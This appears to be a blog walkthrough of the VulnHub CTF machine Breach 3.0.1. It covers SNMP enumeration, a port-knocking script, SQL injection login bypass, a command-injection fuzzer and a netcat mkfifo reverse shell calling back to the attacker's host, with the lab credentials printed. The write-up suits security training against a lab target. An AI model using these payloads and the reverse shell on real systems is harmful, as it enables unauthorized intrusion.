@@ -1,0 +1,683 @@
+<!DOCTYPE html>
+<html lang="en" class="html" data-theme="dark"><head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <title>
+    
+      VulnHub - Breach 3.0.1
+    
+  </title>
+
+  <!-- Begin Jekyll SEO tag v2.7.3 -->
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="VulnHub - Breach 3.0.1" />
+<meta name="author" content="s4rgaz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Description: Is a slightly longer boot2root/CTF challenge which attempts to showcase a few real-world scenarios/vulnerabilities, with plenty of twists and trolls along the way." />
+<meta property="og:description" content="Description: Is a slightly longer boot2root/CTF challenge which attempts to showcase a few real-world scenarios/vulnerabilities, with plenty of twists and trolls along the way." />
+<link rel="canonical" href="http://localhost:4000/breach3.html" />
+<meta property="og:url" content="http://localhost:4000/breach3.html" />
+<meta property="og:site_name" content="Home" />
+<meta property="og:image" content="https://soopr.xyz/images/card?url=http://localhost:4000/breach3.html" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-09-22T00:00:00-05:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="og:image" content="https://soopr.xyz/images/card?url=http://localhost:4000/breach3.html" />
+<meta property="twitter:title" content="VulnHub - Breach 3.0.1" />
+<script type="application/ld+json">
+{"headline":"VulnHub - Breach 3.0.1","dateModified":"2021-09-22T00:00:00-05:00","datePublished":"2021-09-22T00:00:00-05:00","url":"http://localhost:4000/breach3.html","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/breach3.html"},"author":{"@type":"Person","name":"s4rgaz"},"@type":"BlogPosting","description":"Description: Is a slightly longer boot2root/CTF challenge which attempts to showcase a few real-world scenarios/vulnerabilities, with plenty of twists and trolls along the way.","@context":"https://schema.org"}</script>
+<script async defer data-soopr-token="" src="https://sdk.soopr.co/soopr.js"  ></script>
+<!-- End Jekyll SEO tag -->
+ 
+  <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Home" />
+
+  <link rel="shortcut icon" type="image/x-icon" href="//logo.png" />
+  <link rel="stylesheet" href="/assets/css/main.css" />
+  
+    <script type="text/javascript">
+  window.addEventListener('load', themeChange);
+  const currentTheme = localStorage.getItem('theme') ? localStorage.getItem('theme') : null;
+  if (currentTheme)
+    document.documentElement.setAttribute('data-theme', currentTheme);
+
+  function themeChange() {
+    let button = document.querySelector('.theme-toggle');
+
+    button.addEventListener('click', function (e) {
+      let currentTheme = document.documentElement.getAttribute('data-theme');
+      if (currentTheme === 'dark') {
+        transition();
+        document.documentElement.setAttribute('data-theme', 'light');
+        localStorage.setItem('theme', 'light');
+      } else {
+        transition();
+        document.documentElement.setAttribute('data-theme', 'dark');
+        localStorage.setItem('theme', 'dark');
+      }
+    });
+
+    let transition = () => {
+      document.documentElement.classList.add('transition');
+      window.setTimeout(() => {
+        document.documentElement.classList.remove('transition');
+      }, 1000);
+    }
+  }
+</script>
+
+
+  
+
+</head>
+<body>
+    <main class="page-content" aria-label="Content">
+      <div class="w">
+        <header>
+
+<ul class="horizontal-list">
+  
+    <li>
+      <a href="/">
+        Home
+      </a>
+      &nbsp;&nbsp;
+    </li>
+  
+    <li>
+      <a href="/walkthroughs">
+        Walkthroughs
+      </a>
+      &nbsp;&nbsp;
+    </li>
+  
+    <li>
+      <a href="/about">
+        About
+      </a>
+      &nbsp;&nbsp;
+    </li>
+  
+</ul>
+ 
+<!--  <div class="dashed"></div> -->
+
+
+<!--  <h1>Home</h1> -->
+  
+</header>
+
+<a href="/"></a>
+<h1 class="post-title">VulnHub - Breach 3.0.1</h1> 
+<p class="post-date text-bold text-upcase">
+  
+    <span>September 2021</span>
+  
+</p>
+
+<div class="soopr-btn"
+   data-twitter="SooprCo"
+>
+</div>
+ 
+<p><strong>Description:</strong> Is a slightly longer boot2root/CTF challenge which attempts to showcase a few real-world scenarios/vulnerabilities, with plenty of twists and trolls along the way.</p>
+
+<p><strong>Author:</strong> mrb3n</p>
+
+<p><strong>Operating System:</strong> Linux</p>
+
+<p><strong>Aim:</strong> To get root shell and read the flag.</p>
+
+<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/breach-301,177/">https://www.vulnhub.com/entry/breach-301,177/</a></p>
+
+<h2 id="information-gathering">Information Gathering</h2>
+<h3 id="host-discovery">Host Discovery</h3>
+
+<p>With arp-scan I discovered the target on the local network.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>arp-scan <span class="nt">-I</span> vmnet1 192.168.179.1/24
+Interface: vmnet1, <span class="nb">type</span>: EN10MB, MAC: 00:50:56:c0:00:01, IPv4: 192.168.179.1
+WARNING: host part of 192.168.179.1/24 is non-zero
+Starting arp-scan 1.9.7 with 256 hosts <span class="o">(</span>https://github.com/royhills/arp-scan<span class="o">)</span>
+192.168.179.150 00:0c:29:07:a3:39       VMware, Inc.
+192.168.179.254 00:50:56:e8:14:c5       VMware, Inc.
+</code></pre></div></div>
+
+<h3 id="port-scanning">Port Scanning</h3>
+
+<p>I proceed to do a full TCP and UDP port scan with unicornscan, but only could discover the port 161 SNMP.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>us <span class="nt">-mT</span> <span class="nt">-Iv</span> 192.168.179.150:a <span class="nt">-r</span> 3000 <span class="nt">-R</span> 3 <span class="o">&amp;&amp;</span> us <span class="nt">-mU</span> <span class="nt">-Iv</span> 192.168.179.150:a <span class="nt">-r</span> 3000 <span class="nt">-R</span> 3
+adding 192.168.179.150/32 mode <span class="sb">`</span>TCPscan<span class="s1">' ports `a'</span> pps 3000
+using interface<span class="o">(</span>s<span class="o">)</span> vmnet1
+scaning 1.00e+00 total hosts with 1.97e+05 total packets, should take a little longer than 1 Minutes, 12 Seconds
+sender statistics 2112.7 pps with 196608 packets sent total
+listener statistics 0 packets recieved 0 packets droped and 0 interface drops
+adding 192.168.179.150/32 mode <span class="sb">`</span>UDPscan<span class="s1">' ports `a'</span> pps 3000
+using interface<span class="o">(</span>s<span class="o">)</span> vmnet1
+scaning 1.00e+00 total hosts with 1.97e+05 total packets, should take a little longer than 1 Minutes, 12 Seconds
+UDP open 192.168.179.150:161  ttl 64
+sender statistics 2266.6 pps with 196635 packets sent total
+listener statistics 6 packets recieved 0 packets droped and 0 interface drops
+UDP open                    snmp[  161]         from 192.168.179.150  ttl 64
+</code></pre></div></div>
+
+<h3 id="snmp-enumeration">SNMP Enumeration</h3>
+
+<p>I ran all SNMP related nmap scripts, as we can see the public community string is available.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-sU</span> <span class="nt">-Pn</span> <span class="nt">-sV</span> <span class="nt">--script</span> snmp-<span class="k">*</span> <span class="nt">-p161</span> 192.168.179.150
+...
+PORT    STATE SERVICE VERSION
+161/udp open  snmp    SNMPv1 server<span class="p">;</span> net-snmp SNMPv3 server <span class="o">(</span>public<span class="o">)</span>
+| snmp-brute: 
+|_  public - Valid credentials
+| snmp-info: 
+|   enterprise: net-snmp
+|   engineIDFormat: unknown
+|   engineIDData: ad610f2abb4d5b5800000000
+|   snmpEngineBoots: 34
+|_  snmpEngineTime: 21m22s
+| snmp-sysdescr: Linux Initech-DMZ01 4.4.0-45-generic <span class="c">#66~14.04.1-Ubuntu SMP Wed Oct 19 15:05:38 UTC 2016 x86_64</span>
+|_  System <span class="nb">uptime</span>: 21m23.29s <span class="o">(</span>128329 timeticks<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Then enumerated SNMPv1 with the public community string, was possible to detect the the system information, an email and a telephone number, after a lot of time and with no idea to compromise the machine, occurred me to use the telephone number to perform port knocking.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>snmpwalk <span class="nt">-c</span> public <span class="nt">-v</span> 1 192.168.179.150
+iso.3.6.1.2.1.1.1.0 <span class="o">=</span> STRING: <span class="s2">"Linux Initech-DMZ01 4.4.0-45-generic #66~14.04.1-Ubuntu SMP Wed Oct 19 15:05:38 UTC 2016 x86_64"</span>
+iso.3.6.1.2.1.1.2.0 <span class="o">=</span> OID: iso.3.6.1.4.1.8072.3.2.10
+iso.3.6.1.2.1.1.3.0 <span class="o">=</span> Timeticks: <span class="o">(</span>280080<span class="o">)</span> 0:46:40.80
+iso.3.6.1.2.1.1.4.0 <span class="o">=</span> STRING: <span class="s2">"Email: Milton@breach.local - (545)-232-1876"</span>
+iso.3.6.1.2.1.1.5.0 <span class="o">=</span> STRING: <span class="s2">"Initech-DMZ01"</span>
+iso.3.6.1.2.1.1.6.0 <span class="o">=</span> STRING: <span class="s2">"Initech - is this thing on? I doubt anyone thinks to look here, anyways, I've left myself a way back in and burn the place down once again."</span>
+iso.3.6.1.2.1.1.8.0 <span class="o">=</span> Timeticks: <span class="o">(</span>35<span class="o">)</span> 0:00:00.35
+iso.3.6.1.2.1.1.9.1.2.1 <span class="o">=</span> OID: iso.3.6.1.6.3.11.3.1.1
+iso.3.6.1.2.1.1.9.1.2.2 <span class="o">=</span> OID: iso.3.6.1.6.3.15.2.1.1
+iso.3.6.1.2.1.1.9.1.2.3 <span class="o">=</span> OID: iso.3.6.1.6.3.10.3.1.1
+iso.3.6.1.2.1.1.9.1.2.4 <span class="o">=</span> OID: iso.3.6.1.6.3.1
+iso.3.6.1.2.1.1.9.1.2.5 <span class="o">=</span> OID: iso.3.6.1.2.1.49
+iso.3.6.1.2.1.1.9.1.2.6 <span class="o">=</span> OID: iso.3.6.1.2.1.4
+iso.3.6.1.2.1.1.9.1.2.7 <span class="o">=</span> OID: iso.3.6.1.2.1.50
+iso.3.6.1.2.1.1.9.1.2.8 <span class="o">=</span> OID: iso.3.6.1.6.3.16.2.2.1
+iso.3.6.1.2.1.1.9.1.2.9 <span class="o">=</span> OID: iso.3.6.1.6.3.13.3.1.3
+iso.3.6.1.2.1.1.9.1.2.10 <span class="o">=</span> OID: iso.3.6.1.2.1.92
+iso.3.6.1.2.1.1.9.1.3.1 <span class="o">=</span> STRING: <span class="s2">"The MIB for Message Processing and Dispatching."</span>
+iso.3.6.1.2.1.1.9.1.3.2 <span class="o">=</span> STRING: <span class="s2">"The management information definitions for the SNMP User-based Security Model."</span>
+iso.3.6.1.2.1.1.9.1.3.3 <span class="o">=</span> STRING: <span class="s2">"The SNMP Management Architecture MIB."</span>
+iso.3.6.1.2.1.1.9.1.3.4 <span class="o">=</span> STRING: <span class="s2">"The MIB module for SNMPv2 entities"</span>
+iso.3.6.1.2.1.1.9.1.3.5 <span class="o">=</span> STRING: <span class="s2">"The MIB module for managing TCP implementations"</span>
+iso.3.6.1.2.1.1.9.1.3.6 <span class="o">=</span> STRING: <span class="s2">"The MIB module for managing IP and ICMP implementations"</span>
+iso.3.6.1.2.1.1.9.1.3.7 <span class="o">=</span> STRING: <span class="s2">"The MIB module for managing UDP implementations"</span>
+iso.3.6.1.2.1.1.9.1.3.8 <span class="o">=</span> STRING: <span class="s2">"View-based Access Control Model for SNMP."</span>
+iso.3.6.1.2.1.1.9.1.3.9 <span class="o">=</span> STRING: <span class="s2">"The MIB modules for managing SNMP Notification, plus filtering."</span>
+iso.3.6.1.2.1.1.9.1.3.10 <span class="o">=</span> STRING: <span class="s2">"The MIB module for logging SNMP Notifications."</span>
+iso.3.6.1.2.1.1.9.1.4.1 <span class="o">=</span> Timeticks: <span class="o">(</span>31<span class="o">)</span> 0:00:00.31
+iso.3.6.1.2.1.1.9.1.4.2 <span class="o">=</span> Timeticks: <span class="o">(</span>31<span class="o">)</span> 0:00:00.31
+iso.3.6.1.2.1.1.9.1.4.3 <span class="o">=</span> Timeticks: <span class="o">(</span>31<span class="o">)</span> 0:00:00.31
+iso.3.6.1.2.1.1.9.1.4.4 <span class="o">=</span> Timeticks: <span class="o">(</span>31<span class="o">)</span> 0:00:00.31
+iso.3.6.1.2.1.1.9.1.4.5 <span class="o">=</span> Timeticks: <span class="o">(</span>32<span class="o">)</span> 0:00:00.32
+iso.3.6.1.2.1.1.9.1.4.6 <span class="o">=</span> Timeticks: <span class="o">(</span>32<span class="o">)</span> 0:00:00.32
+iso.3.6.1.2.1.1.9.1.4.7 <span class="o">=</span> Timeticks: <span class="o">(</span>32<span class="o">)</span> 0:00:00.32
+iso.3.6.1.2.1.1.9.1.4.8 <span class="o">=</span> Timeticks: <span class="o">(</span>32<span class="o">)</span> 0:00:00.32
+iso.3.6.1.2.1.1.9.1.4.9 <span class="o">=</span> Timeticks: <span class="o">(</span>34<span class="o">)</span> 0:00:00.34
+iso.3.6.1.2.1.1.9.1.4.10 <span class="o">=</span> Timeticks: <span class="o">(</span>35<span class="o">)</span> 0:00:00.35
+iso.3.6.1.2.1.25.1.1.0 <span class="o">=</span> Timeticks: <span class="o">(</span>283658<span class="o">)</span> 0:47:16.58
+iso.3.6.1.2.1.25.1.2.0 <span class="o">=</span> Hex-STRING: 07 E5 09 1D 0E 25 16 00 2D 04 00
+iso.3.6.1.2.1.25.1.3.0 <span class="o">=</span> INTEGER: 393216
+iso.3.6.1.2.1.25.1.4.0 <span class="o">=</span> STRING: <span class="s2">"BOOT_IMAGE=/boot/vmlinuz-4.4.0-45-generic root=UUID=56e63cea-5a5c-4f59-babf-fdd403f70674 ro tty12 quiet splash"</span>
+iso.3.6.1.2.1.25.1.5.0 <span class="o">=</span> Gauge32: 0
+iso.3.6.1.2.1.25.1.6.0 <span class="o">=</span> Gauge32: 34
+iso.3.6.1.2.1.25.1.7.0 <span class="o">=</span> INTEGER: 0
+End of MIB
+</code></pre></div></div>
+
+<p><strong>Port Knocking</strong></p>
+
+<p>So I developed a python script, gave it execute permissions and run it.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span>
+<span class="kn">import</span> <span class="nn">socket</span><span class="p">,</span><span class="n">sys</span>
+
+<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">5</span><span class="p">:</span>
+    <span class="k">print</span> <span class="p">(</span><span class="s">f"Usage: ./</span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s"> [Ip] [Port1] [Port2] [Port3]"</span><span class="p">)</span>
+    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+<span class="n">ip</span><span class="o">=</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+
+
+<span class="k">def</span> <span class="nf">connect</span><span class="p">(</span><span class="n">port</span><span class="p">):</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+        <span class="n">s</span><span class="p">.</span><span class="n">settimeout</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
+        <span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span><span class="n">port</span><span class="p">))</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="k">pass</span>
+
+
+<span class="k">if</span> <span class="n">__name__</span><span class="o">==</span><span class="s">"__main__"</span><span class="p">:</span>
+    <span class="k">for</span> <span class="n">port</span> <span class="ow">in</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">:]:</span>
+        <span class="n">connect</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">port</span><span class="p">))</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s">"Done"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">chmod </span>755 knock.py 
+root@kali:~<span class="nv">$ </span>./knock.py 192.168.179.150 545 232 1876
+Done
+</code></pre></div></div>
+
+<p>Then I re-scan all TCP and UDP ports.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>us <span class="nt">-mT</span> <span class="nt">-Iv</span> 192.168.179.150:a <span class="nt">-r</span> 3000 <span class="nt">-R</span> 3 <span class="o">&amp;&amp;</span> us <span class="nt">-mU</span> <span class="nt">-Iv</span> 192.168.179.150:a <span class="nt">-r</span> 3000 <span class="nt">-R</span> 3
+...
+adding 192.168.179.150/32 mode <span class="sb">`</span>TCPscan<span class="s1">' ports `a'</span> pps 3000
+sender statistics 2885.5 pps with 196608 packets sent total
+listener statistics 54 packets recieved 0 packets droped and 0 interface drops
+TCP open                     ssh[   22]         from 192.168.179.150  ttl 64 
+TCP open                  telnet[   23]         from 192.168.179.150  ttl 64 
+TCP open             dls-monitor[ 2048]         from 192.168.179.150  ttl 64 
+TCP open                     bre[ 4096]         from 192.168.179.150  ttl 64 
+TCP open                 unknown[ 5800]         from 192.168.179.150  ttl 64 
+TCP open            mvs-capacity[10007]         from 192.168.179.150  ttl 64 
+TCP open                 octopus[10008]         from 192.168.179.150  ttl 64 
+TCP open                 unknown[10009]         from 192.168.179.150  ttl 64 
+TCP open                 unknown[10010]         from 192.168.179.150  ttl 64 
+adding 192.168.179.150/32 mode <span class="sb">`</span>UDPscan<span class="s1">' ports `a'</span> pps 3000
+using interface<span class="o">(</span>s<span class="o">)</span> vmnet1
+scaning 1.00e+00 total hosts with 1.97e+05 total packets, should take a little longer than 1 Minutes, 12 Seconds
+UDP open 192.168.179.150:161  ttl 64
+sender statistics 2784.2 pps with 196635 packets sent total
+listener statistics 6 packets recieved 0 packets droped and 0 interface drops
+UDP open                    snmp[  161]         from 192.168.179.150  ttl 64
+</code></pre></div></div>
+
+<h3 id="ssh-enumeration">SSH Enumeration</h3>
+
+<p>All TCP ports were irrelevant except for the SSH service that contained in the banner another telephone number that we can do port Knocking again.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ssh <span class="nt">-l</span> milton 192.168.179.150
+<span class="k">**********************************************************************</span>
+<span class="k">*</span>                                                                    <span class="k">*</span> 
+<span class="k">*</span>          The Bobs Cloud Hosting, LLC. Secure Backdoor              <span class="k">*</span>
+<span class="k">*</span>                                                                    <span class="k">*</span> 
+<span class="k">*</span>                                                                    <span class="k">*</span>
+<span class="k">*</span>  If you wish to discuss cloud hosting options, give us a call at   <span class="k">*</span>
+<span class="k">*</span>                                                                    <span class="k">*</span>
+<span class="k">*</span>   555-423-1800 or email us at thebobs@thebobscloudhostingllc.net   <span class="k">*</span>
+<span class="k">*</span>                                                                    <span class="k">*</span> 
+<span class="k">**********************************************************************</span>
+
+milton@192.168.179.150<span class="s1">'s password:
+</span></code></pre></div></div>
+
+<p>So I ran the port knocking script.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>./knock.py 192.168.179.150 555 423 1800
+Done
+</code></pre></div></div>
+
+<p>I ran unicornscan again to discover TCP and UDP ports.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>us <span class="nt">-mT</span> <span class="nt">-Iv</span> 192.168.179.150:a <span class="nt">-r</span> 3000 <span class="nt">-R</span> 3 <span class="o">&amp;&amp;</span> us <span class="nt">-mU</span> <span class="nt">-Iv</span> 192.168.179.150:a <span class="nt">-r</span> 3000 <span class="nt">-R</span> 3
+adding 192.168.179.150/32 mode <span class="sb">`</span>TCPscan<span class="s1">' ports `a'</span> pps 3000
+using interface<span class="o">(</span>s<span class="o">)</span> vmnet1
+scaning 1.00e+00 total hosts with 1.97e+05 total packets, should take a little longer than 1 Minutes, 12 Seconds
+TCP open 192.168.179.150:8  ttl 64
+TCP open 192.168.179.150:22  ttl 64
+sender statistics 2071.8 pps with 196608 packets sent total
+listener statistics 12 packets recieved 0 packets droped and 0 interface drops
+TCP open                 unknown[    8]         from 192.168.179.150  ttl 64 
+TCP open                     ssh[   22]         from 192.168.179.150  ttl 64 
+adding 192.168.179.150/32 mode <span class="sb">`</span>UDPscan<span class="s1">' ports `a'</span> pps 3000
+using interface<span class="o">(</span>s<span class="o">)</span> vmnet1
+scaning 1.00e+00 total hosts with 1.97e+05 total packets, should take a little longer than 1 Minutes, 12 Seconds
+sender statistics 2105.0 pps with 196635 packets sent total
+listener statistics 0 packets recieved 0 packets droped and 0 interface drops
+</code></pre></div></div>
+
+<p>I did version detection and script scanning of the open ports.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p8</span>,22 192.168.179.150
+...
+PORT   STATE SERVICE VERSION
+8/tcp  open  http    Apache httpd
+| http-auth: 
+| HTTP/1.1 401 Unauthorized<span class="se">\x</span>0D
+|_  Basic <span class="nv">realm</span><span class="o">=</span>milton
+|_http-server-header: Apache
+|_http-title: 401 Unauthorized
+22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   1024 12:1b:d5:b9:d9:6e:30:97:cf:5e:2c:9b:7b:86:01:d6 <span class="o">(</span>DSA<span class="o">)</span>
+|   2048 06:ae:3d:c1:4b:3f:58:9d:d3:1d:de:4c:ac:a4:8a:76 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 ab:35:42:2b:59:1c:ef:6d:4c:02:18:cd:07:9e:fa:45 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 44:66:05:63:1e:a9:21:44:d0:8e:1d:d9:3a:84:cc:ef <span class="o">(</span>ED25519<span class="o">)</span>
+</code></pre></div></div>
+
+<p>As we can see an unusual web service is running on port 8 and the SSH service is running on port 22.</p>
+
+<h3 id="web-enumeration">Web Enumeration</h3>
+
+<p>Interacting with the web service I found that a basic authentication system is running and it asks us for the credentials to log in, milton’s password is the same one we found in breach 1.</p>
+
+<p><img src="/assets/images/breach3/screenshot-1.png" alt="" /></p>
+
+<p>This directed me to the milton website, I clicked on <strong>place</strong> link and redirected me to a login web page.</p>
+
+<p><img src="/assets/images/breach3/screenshot-2.png" alt="" /></p>
+
+<p>There I tried a basic SQL injection on password field and it was possible to bypass the login page.</p>
+
+<p><img src="/assets/images/breach3/screenshot-3.png" alt="" /></p>
+
+<p><img src="/assets/images/breach3/screenshot-4.png" alt="" /></p>
+
+<p>After exploiting sql injection and not finding a way to run remote system commands, I decided to move around the web page and test all, in the Cloud Hosting web page, I clicked on <strong>Emails</strong> button and then on <strong>Livechat</strong> link, there in the form I entered data and submitted it, as part of the URL I could see the <strong>searcher</strong> parameter and tried to test it.</p>
+
+<p><img src="/assets/images/breach3/screenshot-5.png" alt="" /></p>
+
+<p>For this I developed a python fuzzer using a dictionary with the most common attacks.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">base64</span>
+
+<span class="n">url</span><span class="o">=</span><span class="s">"http://192.168.179.150:8/breach3/thebobscloudhostingllc/livechat.php"</span>
+<span class="n">user</span><span class="o">=</span><span class="s">"milton"</span>
+<span class="n">password</span><span class="o">=</span><span class="s">"thelaststraw"</span>
+
+<span class="n">b64_pass_encode</span><span class="o">=</span><span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="s">f"</span><span class="si">{</span><span class="n">user</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="s">"</span><span class="p">,</span><span class="s">"utf-8"</span><span class="p">)).</span><span class="n">decode</span><span class="p">()</span>
+
+<span class="n">s</span><span class="o">=</span><span class="n">requests</span><span class="p">.</span><span class="n">session</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">searcherFuzz</span><span class="p">(</span><span class="n">FUZZ</span><span class="p">):</span>
+    <span class="n">header</span><span class="o">=</span><span class="p">{</span>
+            <span class="s">"Authorization"</span><span class="p">:</span> <span class="s">"Basic {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">b64_pass_encode</span><span class="p">)</span>
+            <span class="p">}</span>
+
+    <span class="n">data</span><span class="o">=</span><span class="p">{</span>
+            <span class="s">"username"</span><span class="p">:</span><span class="s">"admin"</span><span class="p">,</span>
+            <span class="s">"password"</span><span class="p">:</span><span class="s">"' or 1=1 -- -"</span><span class="p">,</span>
+            <span class="s">"submit"</span><span class="p">:</span><span class="s">"+Login+"</span>
+            <span class="p">}</span>
+
+    <span class="n">r</span><span class="o">=</span><span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="s">"http://192.168.179.150:8/breach3/index.php"</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">header</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">=</span><span class="n">s</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">f"</span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s">?searcher=</span><span class="si">{</span><span class="n">FUZZ</span><span class="si">}</span><span class="s">"</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">header</span><span class="p">)</span>
+    <span class="k">return</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">))</span>
+
+<span class="n">wordlist</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="s">"/opt/seclists/Fuzzing/UnixAttacks.fuzzdb.txt"</span><span class="p">).</span><span class="n">read</span><span class="p">().</span><span class="n">splitlines</span><span class="p">()</span>
+
+<span class="k">if</span> <span class="n">__name__</span><span class="o">==</span><span class="s">"__main__"</span><span class="p">:</span>
+    <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="n">wordlist</span><span class="p">:</span>
+        <span class="k">if</span> <span class="s">"11674"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">searcherFuzz</span><span class="p">(</span><span class="n">p</span><span class="p">):</span>
+            <span class="k">print</span><span class="p">(</span><span class="s">f"</span><span class="si">{</span><span class="n">searcherFuzz</span><span class="p">(</span><span class="n">p</span><span class="p">)</span><span class="si">}</span><span class="s"> =&gt; </span><span class="si">{</span><span class="n">p</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>I ran the fuzzer script and found a different response length by the server.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>python3 fuzz.py
+...
+11734 <span class="o">=&gt;</span> %0A/usr/bin/id
+11734 <span class="o">=&gt;</span> %0A/usr/bin/id%0A
+11734 <span class="o">=&gt;</span> %0Aid
+11734 <span class="o">=&gt;</span> %0Aid%0A
+</code></pre></div></div>
+
+<p>I check this and the id command is executed successfully.</p>
+
+<p><img src="/assets/images/breach3/screenshot-6.png" alt="" /></p>
+
+<p>Then I read the <strong>livechat.php</strong> file and found the disallowed characters, this helped me to run the commands in a structured way.</p>
+
+<p><img src="/assets/images/breach3/screenshot-7.png" alt="" /></p>
+
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="command-injection">Command Injection</h3>
+
+<p>To bypass the restrictions I wrote a netcat reverse shell in the server to then run it, the server was not allowing outbound traffic to other ports, so I thought about using the port 22, as it’s currently listening on the target, there’s a possibility that outgoing traffic is allowed on that port.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">rm</span> /tmp/f<span class="p">;</span><span class="nb">mkfifo</span> /tmp/f<span class="p">;</span><span class="nb">cat</span> /tmp/f|/bin/sh <span class="nt">-i</span> 2&gt;&amp;1|nc 192.168.179.1 22 <span class="o">&gt;</span>/tmp/f
+</code></pre></div></div>
+
+<p><img src="/assets/images/breach3/screenshot-8.png" alt="" /></p>
+
+<p>Set up a netcat listener on port 22, and then run the netcat reverse shell saved on the server.</p>
+
+<p><img src="/assets/images/breach3/screenshot-9.png" alt="" /></p>
+
+<p>We get a reverse shell and then I upgraded it to a TTY shell.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 22                   
+listening on <span class="o">[</span>any] 22 ...                                  
+connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.150] 50130
+/bin/sh: 0: can<span class="s1">'t access tty; job control turned off            
+$ id                                                        
+uid=1003(samir) gid=1003(samir) groups=1003(samir),27(sudo)
+$ script -qc /bin/bash /dev/null                                
+samir@Initech-DMZ01:/var/www/html/breach3/thebobscloudhostingllc$
+</span></code></pre></div></div>
